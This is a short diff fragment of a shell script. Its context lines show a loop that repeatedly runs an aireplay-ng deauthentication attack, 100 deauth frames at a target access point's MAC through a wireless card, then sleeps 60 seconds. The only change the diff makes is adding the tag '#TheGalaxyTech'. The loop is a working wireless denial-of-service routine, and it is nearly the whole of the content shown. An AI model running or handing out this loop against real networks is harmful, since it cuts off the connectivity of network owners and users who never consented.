@@ -21,3 +21,5 @@ do
    aireplay-ng -0 100 -a $mac $wcard
    sleep 60
 done
+
+#TheGalaxyTech
